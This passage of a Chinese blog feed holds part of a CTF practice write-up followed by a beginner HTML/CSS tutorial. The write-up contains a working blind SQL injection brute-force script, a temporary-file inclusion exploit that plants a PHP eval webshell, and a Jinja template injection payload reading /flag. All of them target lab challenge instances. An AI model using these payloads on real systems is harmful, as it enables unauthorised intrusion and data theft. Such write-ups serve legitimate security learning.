alt="image-20220402142608573"></p><p>进去以后直接给你了sql语句。</p><p>先不管别的扫一下目录再说</p><p>发现xxx/robots.txt文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143249697.png" alt="image-20220402143249697"></p><p>再到hin.txt查看<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143334665.png" alt="image-20220402143334665"></p><p>给出了过滤得字符串，并且说的很明白如果得到admin得密码就可以得到flag，但是这里得过滤是非常严格得。</p><p>fuzz一下</p><p>发现regexp没有被过滤</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143542801.png" alt="image-20220402143542801"></p><p>sql语句是</p><pre><code>select * from users where username = &#39;&#39; and passwd = &#39;&#39;</code></pre><p>我们可以再username中加反斜杠注释掉单引号</p><pre><code>select * from users where username = &#39;aaa\&#39; and passwd = &#39;||/**/passwd/**/regexp/**/&quot;^a&quot;;%00&#39;</code></pre><p>对a进行一个简单得fuzz，判断成功时得响应包</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160348046.png" alt="image-20220402160348046"></p><p>发现y，响应包是一个302跳转，到welcome.php</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160421355.png" alt="image-20220402160421355"></p><p>根据这个就可以编写出payload</p><pre><code class="python">import timeimport requestsimport stringfrom urllib import parseres = &#39;&#39;url = &#39;http://494b5c51-766a-475c-b86d-320809ca2d50.node4.buuoj.cn:81/index.php&#39;string = string.digits + string.ascii_lowercase + &#39;_&#39; # 猜测密码由数字，小写字母和下划线组成for i in range(0, 200):    for s in string:        data = &#123;            &quot;username&quot;: &quot;sakura\\&quot;,            &quot;passwd&quot;: &quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format((res+s), parse.unquote(&#39;%00&#39;))        &#125;        response = requests.post(url, data)        print(response)        time.sleep(0.5)        if &quot;welcome&quot; in response.text:            res = res + s            print(res)        else:            continue</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130031558.png" alt="image-20220403130031558"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130154421.png" alt="image-20220403130154421"></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>进去直接显示这个</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130428719.png" alt="image-20220403130428719"></p><p>查看源代码，疑似hash长度扩展攻击</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130441800.png" alt="image-20220403130441800"></p><p>抓取请求包，发现hash值</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403131445202.png" alt="image-20220403131445202"></p><p>直接pass传一下，发现提示文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132151777.png" alt="image-20220403132151777"></p><p>发现文件包含</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132341966.png" alt="image-20220403132341966"></p><p>扫一下目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403140421790.png" alt="image-20220403140421790"></p><p>读取下源码</p><p>index.php</p><pre><code class="php">&lt;?phpinclude &#39;config.php&#39;;@$name=$_GET[&#39;name&#39;];@$pass=$_GET[&#39;pass&#39;];if(md5($secret.$name)===$pass)&#123;    echo &#39;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;flflflflag.php&quot;;    &lt;/script&gt;&#39;;&#125;else&#123;    setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);    echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt;</code></pre><p>flflflflag.php</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>config.php</p><pre><code class="php">&lt;?php$secret=&#39;%^$&amp;$#fffdflag_is_not_here_ha_ha&#39;;?&gt;</code></pre><p>dir.php</p><pre><code class="php">&lt;?phpvar_dump(scandir(&#39;/tmp&#39;));?&gt;</code></pre><p>由于伪协议被过滤，所以我们不能利用伪协议进行写马，这里考察得是php临时文件包含</p><p>php7 segment fault特性:<br>php://filter/string.strip_tags=/etc/passwd<br>php执行过程中出现 Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除</p><p>具体可参阅文章:<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>payload:</p><pre><code>import requestsfrom io import BytesIOurl = &#39;http://bcd936cd-a002-414f-ba12-3fabf74c16ae.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#39;payload = &quot;&lt;?php eval($_POST[&#39;x&#39;]) ?&gt;&quot;files = &#123;    &quot;file&quot;: BytesIO(payload.encode())&#125;try:    requests.post(url=url, files=files, allow_redirects=False)except:    print(&quot;false&quot;)</code></pre><p>查看dir.php，成功写入文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403144556928.png" alt="image-20220403144556928"></p><p>执行一句话木马，flag在phpinfo中</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145618596.png" alt="image-20220403145618596"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145643489.png" alt="image-20220403145643489"></p><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150038070.png" alt="image-20220403150038070"></p><p>没有什么发现，尝试访问下secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150107744.png" alt="image-20220403150107744"></p><p>那我就把secret当作参数，传入一个值试一试</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150322198.png" alt="image-20220403150322198"></p><p>很明显，它把我输入得值进行了一个加密</p><p>没有什么发现，随便输入一些字符串，它就爆错了，，，</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150432386.png" alt="image-20220403150432386"></p><p>寻找可利用的信息</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150631904.png" alt="image-20220403150631904"></p><p>找到了加密方式是RC4,存在render，应该是模板注入</p><p>这是一个RC4加密脚本</p><pre><code>import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):    # print(&quot;RC4加密主函数&quot;)    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可    # print(&quot;原来的 s 盒：%s&quot; % s_box)    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)    return s_boxdef rc4_excrypt(plain, box):    # print(&quot;调用加密程序成功。&quot;)    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    # print(&quot;res用于加密字符串，加密后是：%res&quot; %res)    cipher = &quot;&quot;.join(res)    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))    #print(&quot;加密后的输出(经过编码):&quot;)    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;&quot;)</code></pre><p>首先列出所有子类</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151137684.png" alt="image-20220403151137684"></p><p>传给secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151206120.png" alt="image-20220403151206120"></p><p>寻找可利用子类</p><p>给出一个脚本</p><p>find.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;subprocess.Popen&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>寻找warnings.catch_warnings类</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152312044.png" alt="image-20220403152312044"></p><p>payload</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__['__builtins__']['open']('/flag').read()&#125;&#125;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152255110.png" alt="image-20220403152255110"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;题目列表&quot;&gt;&lt;a href=&quot;#题目列表&quot; class=&quot;headerlink&quot; title=&quot;题目列表&quot;&gt;&lt;/a&gt;题目列表&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Web方向：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[b01lers2020]Welco</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="https://sakurahack-y.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>html学习笔记</title>
    <link href="https://sakurahack-y.github.io/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-03-24T07:11:45.000Z</published>
    <updated>2022-03-26T16:51:46.402Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="简单的HTML页面架构"><a href="#简单的HTML页面架构" class="headerlink" title="简单的HTML页面架构"></a>简单的HTML页面架构</h1><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;charset  编码 gbk gbk2312 utf-8</code></pre><h1 id="HTML常见标签"><a href="#HTML常见标签" class="headerlink" title="HTML常见标签"></a>HTML常见标签</h1><h2 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h2><pre><code class="html">&lt;meta&gt; 元素可提供有关页面的元信息（meta-information），比如针对搜索引擎和更新频度的描述和关键词。设置网站关键字meta name=&quot;keywords&quot; content=&quot;网络安全，WEB渗透，数据安全，渗透测试，安全培训&quot; /&gt;&lt;link&gt; 标签定义文档与外部资源的关系。&lt;script&gt; 引入js文件注释&lt;!--这是一段注释。注释不会在浏览器中显示。--&gt;&lt;p&gt;这是一段普通的段落。&lt;/p&gt;</code></pre><p>简单demo</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;这里是sakura的博客&lt;/title&gt;        &lt;meta name=&quot;keywords&quot; content=&quot;网络安全，渗透测试，代码审计&quot;/&gt;        &lt;meta name=&quot;description&quot; content=&quot;这是sakura的博客，分享自己的学习经验&quot; /&gt;        &lt;meta name=&quot;author&quot; content=&quot;sakura&quot; /&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>效果图:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154159328.png" alt="image-20220324154159328"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154219201.png" alt="image-20220324154219201"></p><h2 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h2><pre><code class="html">由大到小&lt;h1&gt;h1&lt;/h1&gt;&lt;h2&gt;h2&lt;/h2&gt;&lt;h3&gt;h3&lt;/h3&gt;&lt;h4&gt;h4&lt;/h4&gt;&lt;h5&gt;h5&lt;/h5&gt;&lt;h6&gt;6&lt;/h6&gt;&lt;/br&gt; 换行标签&lt;hr&gt;换行线标签</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155054152.png" alt="image-20220324155054152"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155038536.png" alt="image-20220324155038536"></p><h2 id="文本属性"><a href="#文本属性" class="headerlink" title="文本属性"></a>文本属性</h2><pre><code class="html">&lt;strong&gt;加粗&lt;/strong&gt;&lt;b&gt;&lt;/b&gt;加粗&lt;i&gt;&lt;/i&gt;斜体&lt;u&gt;&lt;/u&gt; 下划线&lt;sup&gt;&lt;/sup&gt;上标&lt;sub&gt;&lt;/sub&gt;下标&lt;del&gt;&lt;/del&gt; 删除线&lt;font&gt;&lt;/font&gt; 规定字体属性    size 字体的大小    color 字体颜色    代码样式原样输出&lt;pre&gt;&lt;/pre&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324163340955.png" alt="image-20220324163340955"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324162943229.png" alt="image-20220324162943229"></p><h2 id="form表单"><a href="#form表单" class="headerlink" title="form表单"></a>form表单</h2><p>form表单 规定当提交表单时向何处发送表单数据</p><p>method 提交的方法有 get、post</p><p>规定在发送表单数据之前如何对其进行编码：</p><p><strong>enctype 属性可能的值：</strong></p><p>​        application/x-www-form-urlencoded</p><p>​        multipart/form-data</p><p>​        text/plain</p><p><strong>input标签:</strong></p><p>name：同样是表示的该文本输入框名称。</p><p>size：输入框的长度大小。</p><p>maxlength：输入框中允许输入字符的最大数。</p><p>value：输入框中的默认值</p><p>readonly：表示该框中只能显示，不能添加修改。</p><p><strong>input的类型:</strong></p><p>type=password 密码输入框</p><p>type=file 文件上传</p><p>type=hidden 隐藏域</p><p>button 按钮</p><p>checkbox 复选框</p><p>radio 单选框</p><p>type=submit 提交按钮</p><p>type=reset  重置按钮</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;这是一个表单e&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;            &lt;label&gt;用户名: &lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; size=&quot;30&quot; maxlength=&quot;6&quot; value=&quot;sakura&quot; readonly=&quot;&quot; /&gt;&lt;/br&gt;            &lt;label&gt;密&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;码:&lt;/label&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;  /&gt;&lt;/br&gt;            &lt;label&gt;技&amp;nbsp;能:&lt;/label&gt;安全开发&lt;input type=&quot;checkbox&quot; /&gt;渗透测试&lt;input type=&quot;checkbox&quot; /&gt;&lt;/br&gt;            &lt;label&gt;性&amp;nbsp;别:&lt;/label&gt;男&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;1&quot; /&gt;女&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;2&quot; /&gt;            &lt;input type=&quot;hidden&quot; value=&quot;1&quot; /&gt;&lt;/br&gt;            &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;            &lt;input type=&quot;reset&quot; value=&quot;重置&quot; /&gt;            &lt;input type=&quot;button&quot; value=&quot;button&quot; /&gt;        &lt;/form&gt;        &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;            &lt;input type=&quot;file&quot; value=&quot;file&quot; /&gt;            &lt;input type=&quot;submit&quot; /&gt;        &lt;/form&gt;            &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324210305845.png" alt="image-20220324210305845"></p><h2 id="a标签、img标签、table标签"><a href="#a标签、img标签、table标签" class="headerlink" title="a标签、img标签、table标签"></a>a标签、img标签、table标签</h2><pre><code class="html">a标签的作用：就是用于控制界面与页面之间的跳转默认就是selfself：用于在当前选项卡中跳转，也就是不新建页面跳转_blank ：用于在新的选项卡中跳转，也就是新建页面跳转&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;self&quot;&gt;百度&lt;/a&gt;&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;百度&lt;/a&gt;_blank    在新窗口中打开被链接文档。_self    默认。在相同的框架中打开被链接文档。_parent    在父框架集中打开被链接文档。_top    在整个窗口中打开被链接文档。</code></pre><h2 id="锚文本"><a href="#锚文本" class="headerlink" title="锚文本"></a>锚文本</h2><pre><code class="html">&lt;a name=&quot;top&quot;&gt;锚点&lt;/a&gt;&lt;a href=&quot;#top&quot;&gt;锚点&lt;/a&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212519652.png" alt="image-20220324212519652"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212536673.png" alt="image-20220324212536673"></p><h2 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h2><pre><code class="html">img 元素向网页中嵌入一幅图像。&lt;img src=&quot;img/sakura.jpg&quot; width=&quot;400&quot; height=&quot;500&quot; alt=&quot;logo&quot;/&gt;alt 规定图像的替代文本。src  规定显示图像的urlwidth 规定图片的高度height 规定图片的宽度</code></pre><p>  <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324213845918.png" alt="image-20220324213845918"></p><h2 id="table表格"><a href="#table表格" class="headerlink" title="table表格"></a>table表格</h2><pre><code class="html">&lt;caption&gt;我的标题&lt;/caption&gt;表格带标题border 边框width 宽度height 高度colspan 合并行rowspan 合并竖&lt;th&gt;&lt;/th&gt; 定义表格内的表头单元格&lt;tr&gt;行&lt;/tr&gt;&lt;td&gt;表格&lt;/td&gt;cellpadding 单元边与内容的空白cellspacing 单元格的空白</code></pre><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;table border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;10&quot;&gt;            &lt;caption&gt;HY和WYF❤&lt;/caption&gt;            &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;年龄&lt;/th&gt;&lt;th&gt;在一起时间&lt;/th&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;HY&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;td rowspan=&quot;2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;299天&lt;/td&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;WYF&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;/tr&gt;        &lt;/table&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324220335722.png" alt="image-20220324220335722"></p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><pre><code class="html">&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><pre><code class="html">    项目符号 square circle disc&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324221810168.png" alt="image-20220324221810168"></p><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><pre><code class="html">    数字列表 默认 数字    小写字母列表     大写字母列表 A    罗马字母列表  I    小写罗马字母列表 i&lt;ol type=&quot;1&quot;&gt; &lt;!--有序列表--&gt;            &lt;li&gt;暗月实战项目九 不出网的情况下的内网多域控渗透&lt;/li&gt;            &lt;li&gt;xp/2003开关3389指令&lt;/li&gt;            &lt;li&gt;一条命令修改windows注册表&lt;/li&gt;&lt;/ol&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324222526957.png" alt="image-20220324222526957"></p><h2 id="框架使用"><a href="#框架使用" class="headerlink" title="框架使用"></a>框架使用</h2><p><strong>frameset 元素可定义一个框架集。它被用来组织多个窗口（框架）。每个框架存有独立的文档。在其最简单的应用中，frameset 元素仅仅会规定在框架集中存在多少列或多少行。您必须使用 cols 或 rows 属性。</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/clip_image002.png" alt="布局"></p><p>frameset 在一个页面中设置一个或多个框架 不能嵌套在body标签里</p><p>iframe 是在html页面内嵌入框架 框架内可以连接另一个页面</p><p> <strong>frameset属性:</strong></p><p>①border</p><p>设置框架的边框粗细。</p><p>②bordercolor</p><p>设置框架的边框颜色。</p><p>③frameborder</p><p>设置是否显示框架边框。设定值只有0、1；0 表示不要边框，1 表示要显示边框。</p><p>④cols</p><p>纵向分割页面。其数值表示方法有三种：“30%、30（或者30px）、<em>”；数值的个数代表分成的视窗数目且数值之间用“,”隔开。“30%”表示该框架区域占全部浏览器页面区域的30%；“30”表示该区域横向宽度为30像素；“</em>”表示该区域占用余下页面空间。例如：cols=”25%,200,*” 表示将页面分为三部分，左面部分占页面30%，中间横向宽度为200像素，页面余下的作为右面部分。</p><p>⑤rows</p><p>横向分割页面。数值表示方法与意义与cols相同。</p><p>⑥framespacing</p><p>设置框架与框架间的保留的空白距离。</p><p> <strong>frame属性:</strong></p><p>①name</p><p>设置框架名称。此为必须设置的属性。</p><p>②src</p><p>设置此框架要显示的网页名称或路径。此为必须设置的属性。</p><p>③scrolling</p><p>设置是否要显示滚动条。设定值为auto, yes, no。</p><p>auto 在需要的情况下出现滚动条（默认值）</p><p>yes 始终显示滚动条（即使不需要）</p><p>no  从不显示滚动条（即使需要）</p><p>④bordercolor</p><p>设置框架的边框颜色。</p><p>⑤frameborder</p><p>设置是否显示框架边框。设定值只有0、1；0 表示不要边框，1 表示要显示边框。</p><p>⑥noresize</p><p>设置框架大小是否能手动调节。</p><p>⑦marginwidth</p><p>设置框架边界和其中内容之间的宽度。</p><p>⑧marginhight</p><p>设置框架边界和其中内容之间的高度。</p><p>⑨width</p><p>设置框架宽度。</p><p>⑩height</p><p>设置框架高度。</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235313862.png" alt="image-20220324235313862"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235247186.png" alt="image-20220324235247186"></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;frameset rows=&quot;50%,50%&quot;&gt;         &lt;frame src=&quot;https://nsl.lenovo.com.cn/&quot; scrolling=&quot;no&quot; /&gt;        &lt;frame src=&quot;http://www.sogou.com&quot; /&gt;    &lt;/frameset&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324224952975.png" alt="image-20220324224952975" style="zoom:50%;"><hr><h1 id="div-css"><a href="#div-css" class="headerlink" title="div css"></a>div css</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p><p>CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p><p>DIV是html的一个标签 css是一个样式表</p><h2 id="样式表类型"><a href="#样式表类型" class="headerlink" title="样式表类型"></a>样式表类型</h2><h3 id="嵌入式样式表"><a href="#嵌入式样式表" class="headerlink" title="嵌入式样式表"></a>嵌入式样式表</h3><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;        &lt;style&gt;            .demo01&#123;                color: mediumvioletred;                width: 1000px;                height: 500px;                background: salmon;            &#125;        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div class=&quot;demo01&quot;&gt;            人生若只如初见，何事秋风悲画扇        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325210711988.png" alt="image-20220325210711988"></p><h3 id="外部样式"><a href="#外部样式" class="headerlink" title="外部样式"></a>外部样式</h3><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;/&gt;@import url@import url(&quot;g.css&quot;);.demo1&#123;                color: red;                width: 100px;                height: 100px;                background: blue;            &#125;</code></pre><p><strong>1、link直接引用</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325211849732.png" 